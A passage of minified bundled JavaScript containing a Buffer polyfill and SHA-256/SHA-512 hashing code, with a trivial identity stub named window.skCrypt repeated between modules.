        );
      }),
      (c.prototype.readBigInt64LE = tt(function (t) {
        j((t >>>= 0), "offset");
        const e = this[t],
          n = this[t + 7];
        (void 0 !== e && void 0 !== n) || G(t, this.length - 8);
        const r =
          this[t + 4] + 256 * this[t + 5] + 65536 * this[t + 6] + (n << 24);
        return (
          (BigInt(r) << BigInt(32)) +
          BigInt(e + 256 * this[++t] + 65536 * this[++t] + this[++t] * 2 ** 24)
        );
      })),
      (c.prototype.readBigInt64BE = tt(function (t) {
        j((t >>>= 0), "offset");
        const e = this[t],
          n = this[t + 7];
        (void 0 !== e && void 0 !== n) || G(t, this.length - 8);
        const r = (e << 24) + 65536 * this[++t] + 256 * this[++t] + this[++t];
        return (
          (BigInt(r) << BigInt(32)) +
          BigInt(this[++t] * 2 ** 24 + 65536 * this[++t] + 256 * this[++t] + n)
        );
      })),
      (c.prototype.readFloatLE = function (t, e) {
        return (
          (t >>>= 0), e || O(t, 4, this.length), n.read(this, t, !0, 23, 4)
        );
      }),
      (c.prototype.readFloatBE = function (t, e) {
        return (
          (t >>>= 0), e || O(t, 4, this.length), n.read(this, t, !1, 23, 4)
        );
      }),
      (c.prototype.readDoubleLE = function (t, e) {
        return (
          (t >>>= 0), e || O(t, 8, this.length), n.read(this, t, !0, 52, 8)
        );
      }),
      (c.prototype.readDoubleBE = function (t, e) {
        return (
          (t >>>= 0), e || O(t, 8, this.length), n.read(this, t, !1, 52, 8)
        );
      }),
      (c.prototype.writeUintLE = c.prototype.writeUIntLE =
        function (t, e, n, r) {
          if (((t = +t), (e >>>= 0), (n >>>= 0), !r)) {
            M(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
          }
          let o = 1,
            i = 0;
          for (this[e] = 255 & t; ++i < n && (o *= 256); )
            this[e + i] = (t / o) & 255;
          return e + n;
        }),
      (c.prototype.writeUintBE = c.prototype.writeUIntBE =
        function (t, e, n, r) {
          if (((t = +t), (e >>>= 0), (n >>>= 0), !r)) {
            M(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
          }
          let o = n - 1,
            i = 1;
          for (this[e + o] = 255 & t; --o >= 0 && (i *= 256); )
            this[e + o] = (t / i) & 255;
          return e + n;
        }),
      (c.prototype.writeUint8 = c.prototype.writeUInt8 =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 1, 255, 0),
            (this[e] = 255 & t),
            e + 1
          );
        }),
      (c.prototype.writeUint16LE = c.prototype.writeUInt16LE =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 2, 65535, 0),
            (this[e] = 255 & t),
            (this[e + 1] = t >>> 8),
            e + 2
          );
        }),
      (c.prototype.writeUint16BE = c.prototype.writeUInt16BE =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 2, 65535, 0),
            (this[e] = t >>> 8),
            (this[e + 1] = 255 & t),
            e + 2
          );
        }),
      (c.prototype.writeUint32LE = c.prototype.writeUInt32LE =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 4, 4294967295, 0),
            (this[e + 3] = t >>> 24),
            (this[e + 2] = t >>> 16),
            (this[e + 1] = t >>> 8),
            (this[e] = 255 & t),
            e + 4
          );
        }),
      (c.prototype.writeUint32BE = c.prototype.writeUInt32BE =
        function (t, e, n) {
          return (
            (t = +t),
            (e >>>= 0),
            n || M(this, t, e, 4, 4294967295, 0),
            (this[e] = t >>> 24),
            (this[e + 1] = t >>> 16),
            (this[e + 2] = t >>> 8),
            (this[e + 3] = 255 & t),
            e + 4
          );
        }),
      (c.prototype.writeBigUInt64LE = tt(function (t, e = 0) {
        return L(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"));
      })),
      (c.prototype.writeBigUInt64BE = tt(function (t, e = 0) {
        return N(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"));
      })),
      (c.prototype.writeIntLE = function (t, e, n, r) {
        if (((t = +t), (e >>>= 0), !r)) {
          const r = Math.pow(2, 8 * n - 1);
          M(this, t, e, n, r - 1, -r);
        }
        let o = 0,
          i = 1,
          s = 0;
        for (this[e] = 255 & t; ++o < n && (i *= 256); )
          t < 0 && 0 === s && 0 !== this[e + o - 1] && (s = 1),
            (this[e + o] = (((t / i) | 0) - s) & 255);
        return e + n;
      }),
      (c.prototype.writeIntBE = function (t, e, n, r) {
        if (((t = +t), (e >>>= 0), !r)) {
          const r = Math.pow(2, 8 * n - 1);
          M(this, t, e, n, r - 1, -r);
        }
        let o = n - 1,
          i = 1,
          s = 0;
        for (this[e + o] = 255 & t; --o >= 0 && (i *= 256); )
          t < 0 && 0 === s && 0 !== this[e + o + 1] && (s = 1),
            (this[e + o] = (((t / i) | 0) - s) & 255);
        return e + n;
      }),
      (c.prototype.writeInt8 = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 1, 127, -128),
          t < 0 && (t = 255 + t + 1),
          (this[e] = 255 & t),
          e + 1
        );
      }),
      (c.prototype.writeInt16LE = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 2, 32767, -32768),
          (this[e] = 255 & t),
          (this[e + 1] = t >>> 8),
          e + 2
        );
      }),
      (c.prototype.writeInt16BE = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 2, 32767, -32768),
          (this[e] = t >>> 8),
          (this[e + 1] = 255 & t),
          e + 2
        );
      }),
      (c.prototype.writeInt32LE = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 4, 2147483647, -2147483648),
          (this[e] = 255 & t),
          (this[e + 1] = t >>> 8),
          (this[e + 2] = t >>> 16),
          (this[e + 3] = t >>> 24),
          e + 4
        );
      }),
      (c.prototype.writeInt32BE = function (t, e, n) {
        return (
          (t = +t),
          (e >>>= 0),
          n || M(this, t, e, 4, 2147483647, -2147483648),
          t < 0 && (t = 4294967295 + t + 1),
          (this[e] = t >>> 24),
          (this[e + 1] = t >>> 16),
          (this[e + 2] = t >>> 8),
          (this[e + 3] = 255 & t),
          e + 4
        );
      }),
      (c.prototype.writeBigInt64LE = tt(function (t, e = 0) {
        return L(
          this,
          t,
          e,
          -BigInt("0x8000000000000000"),
          BigInt("0x7fffffffffffffff")
        );
      })),
      (c.prototype.writeBigInt64BE = tt(function (t, e = 0) {
        return N(
          this,
          t,
          e,
          -BigInt("0x8000000000000000"),
          BigInt("0x7fffffffffffffff")
        );
      })),
      (c.prototype.writeFloatLE = function (t, e, n) {
        return U(this, t, e, !0, n);
      }),
      (c.prototype.writeFloatBE = function (t, e, n) {
        return U(this, t, e, !1, n);
      }),
      (c.prototype.writeDoubleLE = function (t, e, n) {
        return q(this, t, e, !0, n);
      }),
      (c.prototype.writeDoubleBE = function (t, e, n) {
        return q(this, t, e, !1, n);
      }),
      (c.prototype.copy = function (t, e, n, r) {
        if (!c.isBuffer(t)) throw new TypeError("argument should be a Buffer");
        if (
          (n || (n = 0),
          r || 0 === r || (r = this.length),
          e >= t.length && (e = t.length),
          e || (e = 0),
          r > 0 && r < n && (r = n),
          r === n)
        )
          return 0;
        if (0 === t.length || 0 === this.length) return 0;
        if (e < 0) throw new RangeError("targetStart out of bounds");
        if (n < 0 || n >= this.length)
          throw new RangeError("Index out of range");
        if (r < 0) throw new RangeError("sourceEnd out of bounds");
        r > this.length && (r = this.length),
          t.length - e < r - n && (r = t.length - e + n);
        const o = r - n;
        return (
          this === t && "function" == typeof i.prototype.copyWithin
            ? this.copyWithin(e, n, r)
            : i.prototype.set.call(t, this.subarray(n, r), e),
          o
        );
      }),
      (c.prototype.fill = function (t, e, n, r) {
        if ("string" == typeof t) {
          if (
            ("string" == typeof e
              ? ((r = e), (e = 0), (n = this.length))
              : "string" == typeof n && ((r = n), (n = this.length)),
            void 0 !== r && "string" != typeof r)
          )
            throw new TypeError("encoding must be a string");
          if ("string" == typeof r && !c.isEncoding(r))
            throw new TypeError("Unknown encoding: " + r);
          if (1 === t.length) {
            const e = t.charCodeAt(0);
            (("utf8" === r && e < 128) || "latin1" === r) && (t = e);
          }
        } else
          "number" == typeof t
            ? (t &= 255)
            : "boolean" == typeof t && (t = Number(t));
        if (e < 0 || this.length < e || this.length < n)
          throw new RangeError("Out of range index");
        if (n <= e) return this;
        let o;
        if (
          ((e >>>= 0),
          (n = void 0 === n ? this.length : n >>> 0),
          t || (t = 0),
          "number" == typeof t)
        )
          for (o = e; o < n; ++o) this[o] = t;
        else {
          const i = c.isBuffer(t) ? t : c.from(t, r),
            s = i.length;
          if (0 === s)
            throw new TypeError(
              'The value "' + t + '" is invalid for argument "value"'
            );
          for (o = 0; o < n - e; ++o) this[o + e] = i[o % s];
        }
        return this;
      });
    const W = {};
    function z(t, e, n) {
      W[t] = class extends n {
        constructor() {
          super(),
            Object.defineProperty(this, "message", {
              value: e.apply(this, arguments),
              writable: !0,
              configurable: !0,
            }),
            (this.name = `${this.name} [${t}]`),
            this.stack,
            delete this.name;
        }
        get code() {
          return t;
        }
        set code(t) {
          Object.defineProperty(this, "code", {
            configurable: !0,
            enumerable: !0,
            value: t,
            writable: !0,
          });
        }
        toString() {
          return `${this.name} [${t}]: ${this.message}`;
        }
      };
    }
    function K(t) {
      let e = "",
        n = t.length;
      const r = "-" === t[0] ? 1 : 0;
      for (; n >= r + 4; n -= 3) e = `_${t.slice(n - 3, n)}${e}`;
      return `${t.slice(0, n)}${e}`;
    }
    function F(t, e, n, r, o, i) {
      if (t > n || t < e) {
        const n = "bigint" == typeof e ? "n" : "";
        let r;
        throw (
          ((r =
            0 === e || e === BigInt(0)
              ? `>= 0${n} and < 2${n} ** ${8 * (i + 1)}${n}`
              : `>= -(2${n} ** ${8 * (i + 1) - 1}${n}) and < 2 ** ${
                  8 * (i + 1) - 1
                }${n}`),
          new W.ERR_OUT_OF_RANGE("value", r, t))
        );
      }
      !(function (t, e, n) {
        j(e, "offset"),
          (void 0 !== t[e] && void 0 !== t[e + n]) || G(e, t.length - (n + 1));
      })(r, o, i);
    }
    function j(t, e) {
      if ("number" != typeof t)
        throw new W.ERR_INVALID_ARG_TYPE(e, "number", t);
    }
    function G(t, e, n) {
      if (Math.floor(t) !== t)
        throw (j(t, n), new W.ERR_OUT_OF_RANGE("offset", "an integer", t));
      if (e < 0) throw new W.ERR_BUFFER_OUT_OF_BOUNDS();
      throw new W.ERR_OUT_OF_RANGE("offset", `>= 0 and <= ${e}`, t);
    }
    z(
      "ERR_BUFFER_OUT_OF_BOUNDS",
      function (t) {
        return t
          ? `${t} is outside of buffer bounds`
          : "Attempt to access memory outside buffer bounds";
      },
      RangeError
    ),
      z(
        "ERR_INVALID_ARG_TYPE",
        function (t, e) {
          return `The "${t}" argument must be of type number. Received type ${typeof e}`;
        },
        TypeError
      ),
      z(
        "ERR_OUT_OF_RANGE",
        function (t, e, n) {
          let r = `The value of "${t}" is out of range.`,
            o = n;
          return (
            Number.isInteger(n) && Math.abs(n) > 2 ** 32
              ? (o = K(String(n)))
              : "bigint" == typeof n &&
                ((o = String(n)),
                (n > BigInt(2) ** BigInt(32) ||
                  n < -(BigInt(2) ** BigInt(32))) &&
                  (o = K(o)),
                (o += "n")),
            (r += ` It must be ${e}. Received ${o}`),
            r
          );
        },
        RangeError
      );
    const V = /[^+/0-9A-Za-z-_]/g;
    function H(t, e) {
      let n;
      e = e || 1 / 0;
      const r = t.length;
      let o = null;
      const i = [];
      for (let s = 0; s < r; ++s) {
        if (((n = t.charCodeAt(s)), n > 55295 && n < 57344)) {
          if (!o) {
            if (n > 56319) {
              (e -= 3) > -1 && i.push(239, 191, 189);
              continue;
            }
            if (s + 1 === r) {
              (e -= 3) > -1 && i.push(239, 191, 189);
              continue;
            }
            o = n;
            continue;
          }
          if (n < 56320) {
            (e -= 3) > -1 && i.push(239, 191, 189), (o = n);
            continue;
          }
          n = 65536 + (((o - 55296) << 10) | (n - 56320));
        } else o && (e -= 3) > -1 && i.push(239, 191, 189);
        if (((o = null), n < 128)) {
          if ((e -= 1) < 0) break;
          i.push(n);
        } else if (n < 2048) {
          if ((e -= 2) < 0) break;
          i.push((n >> 6) | 192, (63 & n) | 128);
        } else if (n < 65536) {
          if ((e -= 3) < 0) break;
          i.push((n >> 12) | 224, ((n >> 6) & 63) | 128, (63 & n) | 128);
        } else {
          if (!(n < 1114112)) throw new Error("Invalid code point");
          if ((e -= 4) < 0) break;
          i.push(
            (n >> 18) | 240,
            ((n >> 12) & 63) | 128,
            ((n >> 6) & 63) | 128,
            (63 & n) | 128
          );
        }
      }
      return i;
    }
    function X(t) {
      return e.toByteArray(
        (function (t) {
          if ((t = (t = t.split("=")[0]).trim().replace(V, "")).length < 2)
            return "";
          for (; t.length % 4 != 0; ) t += "=";
          return t;
        })(t)
      );
    }
    function Z(t, e, n, r) {
      let o;
      for (o = 0; o < r && !(o + n >= e.length || o >= t.length); ++o)
        e[o + n] = t[o];
      return o;
    }
    function J(t, e) {
      return (
        t instanceof e ||
        (null != t &&
          null != t.constructor &&
          null != t.constructor.name &&
          t.constructor.name === e.name)
      );
    }
    function Y(t) {
      return t != t;
    }
    const Q = (function () {
      const t = "0123456789abcdef",
        e = new Array(256);
      for (let n = 0; n < 16; ++n) {
        const r = 16 * n;
        for (let o = 0; o < 16; ++o) e[r + o] = t[n] + t[o];
      }
      return e;
    })();
    function tt(t) {
      return "undefined" == typeof BigInt ? et : t;
    }
    function et() {
      throw new Error("BigInt not supported");
    }
  })(Q);
  const ct = Q.Buffer,
    lt = Q.Buffer;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const dt =
    "object" == typeof globalThis && "crypto" in globalThis
      ? globalThis.crypto
      : void 0;
  function ft(t) {
    return (
      t instanceof Uint8Array ||
      (ArrayBuffer.isView(t) && "Uint8Array" === t.constructor.name)
    );
  }
  function ht(t) {
    if (!Number.isSafeInteger(t) || t < 0)
      throw new Error("positive integer expected, got " + t);
  }
  function pt(t, ...e) {
    if (!ft(t)) throw new Error("Uint8Array expected");
    if (e.length > 0 && !e.includes(t.length))
      throw new Error(
        "Uint8Array expected of length " + e + ", got length=" + t.length
      );
  }
  function mt(t, e = !0) {
    if (t.destroyed) throw new Error("Hash instance has been destroyed");
    if (e && t.finished)
      throw new Error("Hash#digest() has already been called");
  }
  function gt(t, e) {
    pt(t);
    const n = e.outputLen;
    if (t.length < n)
      throw new Error(
        "digestInto() expects output buffer of length at least " + n
      );
  }
  function yt(...t) {
    for (let e = 0; e < t.length; e++) t[e].fill(0);
  }
  function wt(t) {
    return new DataView(t.buffer, t.byteOffset, t.byteLength);
  }
  function bt(t, e) {
    return (t << (32 - e)) | (t >>> e);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  function vt(t) {
    return (
      ((t << 24) & 4278190080) |
      ((t << 8) & 16711680) |
      ((t >>> 8) & 65280) |
      ((t >>> 24) & 255)
    );
  }
  const At = (() =>
      68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0])()
      ? (t) => t
      : function (t) {
          for (let e = 0; e < t.length; e++) t[e] = vt(t[e]);
          return t;
        },
    kt = (() =>
      "function" == typeof Uint8Array.from([]).toHex &&
      "function" == typeof Uint8Array.fromHex)(),
    It = Array.from({ length: 256 }, (t, e) => e.toString(16).padStart(2, "0"));
  function St(t) {
    if ((pt(t), kt)) return t.toHex();
    let e = "";
    for (let n = 0; n < t.length; n++) e += It[t[n]];
    return e;
  }
  const _t = 48,
    Tt = 57,
    Ct = 65,
    Bt = 70,
    Et = 97,
    xt = 102;
  function Pt(t) {
    return t >= _t && t <= Tt
      ? t - _t
      : t >= Ct && t <= Bt
      ? t - (Ct - 10)
      : t >= Et && t <= xt
      ? t - (Et - 10)
      : void 0;
  }
  function Rt(t) {
    if ("string" != typeof t)
      throw new Error("hex string expected, got " + typeof t);
    if (kt) return Uint8Array.fromHex(t);
    const e = t.length,
      n = e / 2;
    if (e % 2)
      throw new Error("hex string expected, got unpadded hex of length " + e);
    const r = new Uint8Array(n);
    for (let o = 0, i = 0; o < n; o++, i += 2) {
      const e = Pt(t.charCodeAt(i)),
        n = Pt(t.charCodeAt(i + 1));
      if (void 0 === e || void 0 === n) {
        const e = t[i] + t[i + 1];
        throw new Error(
          'hex string expected, got non-hex character "' + e + '" at index ' + i
        );
      }
      r[o] = 16 * e + n;
    }
    return r;
  }
  function Ot(t) {
    return (
      "string" == typeof t &&
        (t = (function (t) {
          if ("string" != typeof t) throw new Error("string expected");
          return new Uint8Array(new TextEncoder().encode(t));
        })(t)),
      pt(t),
      t
    );
  }
  function Mt(...t) {
    let e = 0;
    for (let r = 0; r < t.length; r++) {
      const n = t[r];
      pt(n), (e += n.length);
    }
    const n = new Uint8Array(e);
    for (let r = 0, o = 0; r < t.length; r++) {
      const e = t[r];
      n.set(e, o), (o += e.length);
    }
    return n;
  }
  class Lt {}
  function Nt(t) {
    const e = (e) => t().update(Ot(e)).digest(),
      n = t();
    return (
      (e.outputLen = n.outputLen),
      (e.blockLen = n.blockLen),
      (e.create = () => t()),
      e
    );
  }
  function Dt(t = 32) {
    if (dt && "function" == typeof dt.getRandomValues)
      return dt.getRandomValues(new Uint8Array(t));
    if (dt && "function" == typeof dt.randomBytes)
      return Uint8Array.from(dt.randomBytes(t));
    throw new Error("crypto.getRandomValues must be defined");
  }
  function Ut(t, e, n) {
    return (t & e) ^ (~t & n);
  }
  function qt(t, e, n) {
    return (t & e) ^ (t & n) ^ (e & n);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  class Wt extends Lt {
    constructor(t, e, n, r) {
      super(),
        (this.finished = !1),
        (this.length = 0),
        (this.pos = 0),
        (this.destroyed = !1),
        (this.blockLen = t),
        (this.outputLen = e),
        (this.padOffset = n),
        (this.isLE = r),
        (this.buffer = new Uint8Array(t)),
        (this.view = wt(this.buffer));
    }
    update(t) {
      mt(this), pt((t = Ot(t)));
      const { view: e, buffer: n, blockLen: r } = this,
        o = t.length;
      for (let i = 0; i < o; ) {
        const s = Math.min(r - this.pos, o - i);
        if (s === r) {
          const e = wt(t);
          for (; r <= o - i; i += r) this.process(e, i);
          continue;
        }
        n.set(t.subarray(i, i + s), this.pos),
          (this.pos += s),
          (i += s),
          this.pos === r && (this.process(e, 0), (this.pos = 0));
      }
      return (this.length += t.length), this.roundClean(), this;
    }
    digestInto(t) {
      mt(this), gt(t, this), (this.finished = !0);
      const { buffer: e, view: n, blockLen: r, isLE: o } = this;
      let { pos: i } = this;
      (e[i++] = 128),
        yt(this.buffer.subarray(i)),
        this.padOffset > r - i && (this.process(n, 0), (i = 0));
      for (let l = i; l < r; l++) e[l] = 0;
      !(function (t, e, n, r) {
        if ("function" == typeof t.setBigUint64) return t.setBigUint64(e, n, r);
        const o = BigInt(32),
          i = BigInt(4294967295),
          s = Number((n >> o) & i),
          a = Number(n & i),
          u = r ? 4 : 0,
          c = r ? 0 : 4;
        t.setUint32(e + u, s, r), t.setUint32(e + c, a, r);
      })(n, r - 8, BigInt(8 * this.length), o),
        this.process(n, 0);
      const s = wt(t),
        a = this.outputLen;
      if (a % 4) throw new Error("_sha2: outputLen should be aligned to 32bit");
      const u = a / 4,
        c = this.get();
      if (u > c.length) throw new Error("_sha2: outputLen bigger than state");
      for (let l = 0; l < u; l++) s.setUint32(4 * l, c[l], o);
    }
    digest() {
      const { buffer: t, outputLen: e } = this;
      this.digestInto(t);
      const n = t.slice(0, e);
      return this.destroy(), n;
    }
    _cloneInto(t) {
      t || (t = new this.constructor()), t.set(...this.get());
      const {
        blockLen: e,
        buffer: n,
        length: r,
        finished: o,
        destroyed: i,
        pos: s,
      } = this;
      return (
        (t.destroyed = i),
        (t.finished = o),
        (t.length = r),
        (t.pos = s),
        r % e && t.buffer.set(n),
        t
      );
    }
    clone() {
      return this._cloneInto();
    }
  }
  const zt = Uint32Array.from([
      1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924,
      528734635, 1541459225,
    ]),
    Kt = Uint32Array.from([
      1779033703, 4089235720, 3144134277, 2227873595, 1013904242, 4271175723,
      2773480762, 1595750129, 1359893119, 2917565137, 2600822924, 725511199,
      528734635, 4215389547, 1541459225, 327033209,
    ]);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Ft = BigInt(2 ** 32 - 1),
    jt = BigInt(32);
  function Gt(t, e = !1) {
    return e
      ? { h: Number(t & Ft), l: Number((t >> jt) & Ft) }
      : { h: 0 | Number((t >> jt) & Ft), l: 0 | Number(t & Ft) };
  }
  function Vt(t, e = !1) {
    const n = t.length;
    let r = new Uint32Array(n),
      o = new Uint32Array(n);
    for (let i = 0; i < n; i++) {
      const { h: n, l: s } = Gt(t[i], e);
      [r[i], o[i]] = [n, s];
    }
    return [r, o];
  }
  const Ht = (t, e, n) => t >>> n,
    Xt = (t, e, n) => (t << (32 - n)) | (e >>> n),
    Zt = (t, e, n) => (t >>> n) | (e << (32 - n)),
    Jt = (t, e, n) => (t << (32 - n)) | (e >>> n),
    Yt = (t, e, n) => (t << (64 - n)) | (e >>> (n - 32)),
    Qt = (t, e, n) => (t >>> (n - 32)) | (e << (64 - n));
  function $t(t, e, n, r) {
    const o = (e >>> 0) + (r >>> 0);
    return { h: (t + n + ((o / 2 ** 32) | 0)) | 0, l: 0 | o };
  }
  const te = (t, e, n) => (t >>> 0) + (e >>> 0) + (n >>> 0),
    ee = (t, e, n, r) => (e + n + r + ((t / 2 ** 32) | 0)) | 0,
    ne = (t, e, n, r) => (t >>> 0) + (e >>> 0) + (n >>> 0) + (r >>> 0),
    re = (t, e, n, r, o) => (e + n + r + o + ((t / 2 ** 32) | 0)) | 0,
    oe = (t, e, n, r, o) =>
      (t >>> 0) + (e >>> 0) + (n >>> 0) + (r >>> 0) + (o >>> 0),
    ie = (t, e, n, r, o, i) => (e + n + r + o + i + ((t / 2 ** 32) | 0)) | 0;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const se = Uint32Array.from([
      1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993,
      2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987,
      1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774,
      264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986,
      2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711,
      113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291,
      1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
      3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344,
      430227734, 506948616, 659060556, 883997877, 958139571, 1322822218,
      1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424,
      2428436474, 2756734187, 3204031479, 3329325298,
    ]),
    ae = new Uint32Array(64);
  class ue extends Wt {
    constructor(t = 32) {
      super(64, t, 8, !1),
        (this.A = 0 | zt[0]),
        (this.B = 0 | zt[1]),
        (this.C = 0 | zt[2]),
        (this.D = 0 | zt[3]),
        (this.E = 0 | zt[4]),
        (this.F = 0 | zt[5]),
        (this.G = 0 | zt[6]),
        (this.H = 0 | zt[7]);
    }
    get() {
      const { A: t, B: e, C: n, D: r, E: o, F: i, G: s, H: a } = this;
      return [t, e, n, r, o, i, s, a];
    }
    set(t, e, n, r, o, i, s, a) {
      (this.A = 0 | t),
        (this.B = 0 | e),
        (this.C = 0 | n),
        (this.D = 0 | r),
        (this.E = 0 | o),
        (this.F = 0 | i),
        (this.G = 0 | s),
        (this.H = 0 | a);
    }
    process(t, e) {
      for (let l = 0; l < 16; l++, e += 4) ae[l] = t.getUint32(e, !1);
      for (let l = 16; l < 64; l++) {
        const t = ae[l - 15],
          e = ae[l - 2],
          n = bt(t, 7) ^ bt(t, 18) ^ (t >>> 3),
          r = bt(e, 17) ^ bt(e, 19) ^ (e >>> 10);
        ae[l] = (r + ae[l - 7] + n + ae[l - 16]) | 0;
      }
      let { A: n, B: r, C: o, D: i, E: s, F: a, G: u, H: c } = this;
      for (let l = 0; l < 64; l++) {
        const t =
            (c +
              (bt(s, 6) ^ bt(s, 11) ^ bt(s, 25)) +
              Ut(s, a, u) +
              se[l] +
              ae[l]) |
            0,
          e = ((bt(n, 2) ^ bt(n, 13) ^ bt(n, 22)) + qt(n, r, o)) | 0;
        (c = u),
          (u = a),
          (a = s),
          (s = (i + t) | 0),
          (i = o),
          (o = r),
          (r = n),
          (n = (t + e) | 0);
      }
      (n = (n + this.A) | 0),
        (r = (r + this.B) | 0),
        (o = (o + this.C) | 0),
        (i = (i + this.D) | 0),
        (s = (s + this.E) | 0),
        (a = (a + this.F) | 0),
        (u = (u + this.G) | 0),
        (c = (c + this.H) | 0),
        this.set(n, r, o, i, s, a, u, c);
    }
    roundClean() {
      yt(ae);
    }
    destroy() {
      this.set(0, 0, 0, 0, 0, 0, 0, 0), yt(this.buffer);
    }
  }
  const ce = (() =>
      Vt(
        [
          "0x428a2f98d728ae22",
          "0x7137449123ef65cd",
          "0xb5c0fbcfec4d3b2f",
          "0xe9b5dba58189dbbc",
          "0x3956c25bf348b538",
          "0x59f111f1b605d019",
          "0x923f82a4af194f9b",
          "0xab1c5ed5da6d8118",
          "0xd807aa98a3030242",
          "0x12835b0145706fbe",
          "0x243185be4ee4b28c",
          "0x550c7dc3d5ffb4e2",
          "0x72be5d74f27b896f",
          "0x80deb1fe3b1696b1",
          "0x9bdc06a725c71235",
          "0xc19bf174cf692694",
          "0xe49b69c19ef14ad2",
          "0xefbe4786384f25e3",
          "0x0fc19dc68b8cd5b5",
          "0x240ca1cc77ac9c65",
          "0x2de92c6f592b0275",
          "0x4a7484aa6ea6e483",
          "0x5cb0a9dcbd41fbd4",
          "0x76f988da831153b5",
          "0x983e5152ee66dfab",
          "0xa831c66d2db43210",
          "0xb00327c898fb213f",
          "0xbf597fc7beef0ee4",
          "0xc6e00bf33da88fc2",
          "0xd5a79147930aa725",
          "0x06ca6351e003826f",
          "0x142929670a0e6e70",
          "0x27b70a8546d22ffc",
          "0x2e1b21385c26c926",
          "0x4d2c6dfc5ac42aed",
          "0x53380d139d95b3df",
          "0x650a73548baf63de",
          "0x766a0abb3c77b2a8",
          "0x81c2c92e47edaee6",
          "0x92722c851482353b",
          "0xa2bfe8a14cf10364",
          "0xa81a664bbc423001",
          "0xc24b8b70d0f89791",
          "0xc76c51a30654be30",
          "0xd192e819d6ef5218",
          "0xd69906245565a910",
          "0xf40e35855771202a",
          "0x106aa07032bbd1b8",
          "0x19a4c116b8d2d0c8",
          "0x1e376c085141ab53",
          "0x2748774cdf8eeb99",
          "0x34b0bcb5e19b48a8",
          "0x391c0cb3c5c95a63",
          "0x4ed8aa4ae3418acb",
          "0x5b9cca4f7763e373",
          "0x682e6ff3d6b2b8a3",
          "0x748f82ee5defb2fc",
          "0x78a5636f43172f60",
          "0x84c87814a1f0ab72",
          "0x8cc702081a6439ec",
          "0x90befffa23631e28",
          "0xa4506cebde82bde9",
          "0xbef9a3f7b2c67915",
          "0xc67178f2e372532b",
          "0xca273eceea26619c",
          "0xd186b8c721c0c207",
          "0xeada7dd6cde0eb1e",
          "0xf57d4f7fee6ed178",
          "0x06f067aa72176fba",
          "0x0a637dc5a2c898a6",
          "0x113f9804bef90dae",
          "0x1b710b35131c471b",
          "0x28db77f523047d84",
          "0x32caab7b40c72493",
          "0x3c9ebe0a15c9bebc",
          "0x431d67c49c100d4c",
          "0x4cc5d4becb3e42b6",
          "0x597f299cfc657e2a",
          "0x5fcb6fab3ad6faec",
          "0x6c44198c4a475817",
        ].map((t) => BigInt(t))
      ))(),
    le = (() => ce[0])(),
    de = (() => ce[1])(),
    fe = new Uint32Array(80),
    he = new Uint32Array(80);
  class pe extends Wt {
    constructor(t = 64) {
      super(128, t, 16, !1),
        (this.Ah = 0 | Kt[0]),
        (this.Al = 0 | Kt[1]),
        (this.Bh = 0 | Kt[2]),
        (this.Bl = 0 | Kt[3]),
        (this.Ch = 0 | Kt[4]),
        (this.Cl = 0 | Kt[5]),
        (this.Dh = 0 | Kt[6]),
        (this.Dl = 0 | Kt[7]),
        (this.Eh = 0 | Kt[8]),
        (this.El = 0 | Kt[9]),
        (this.Fh = 0 | Kt[10]),
        (this.Fl = 0 | Kt[11]),
        (this.Gh = 0 | Kt[12]),
        (this.Gl = 0 | Kt[13]),
        (this.Hh = 0 | Kt[14]),
        (this.Hl = 0 | Kt[15]);
    }
    get() {
      const {
        Ah: t,
        Al: e,
        Bh: n,
        Bl: r,
        Ch: o,
        Cl: i,
        Dh: s,
        Dl: a,
        Eh: u,
        El: c,
        Fh: l,
        Fl: d,
        Gh: f,
        Gl: h,
        Hh: p,
        Hl: m,
      } = this;
      return [t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m];
    }
    set(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m) {
      (this.Ah = 0 | t),
        (this.Al = 0 | e),
        (this.Bh = 0 | n),
        (this.Bl = 0 | r),
        (this.Ch = 0 | o),
        (this.Cl = 0 | i),
        (this.Dh = 0 | s),
        (this.Dl = 0 | a),
        (this.Eh = 0 | u),
        (this.El = 0 | c),
        (this.Fh = 0 | l),
        (this.Fl = 0 | d),
        (this.Gh = 0 | f),
        (this.Gl = 0 | h),
        (this.Hh = 0 | p),
        (this.Hl = 0 | m);
    }
    process(t, e) {
      for (let w = 0; w < 16; w++, e += 4)
        (fe[w] = t.getUint32(e)), (he[w] = t.getUint32((e += 4)));
      for (let w = 16; w < 80; w++) {
        const t = 0 | fe[w - 15],
          e = 0 | he[w - 15],
          n = Zt(t, e, 1) ^ Zt(t, e, 8) ^ Ht(t, 0, 7),
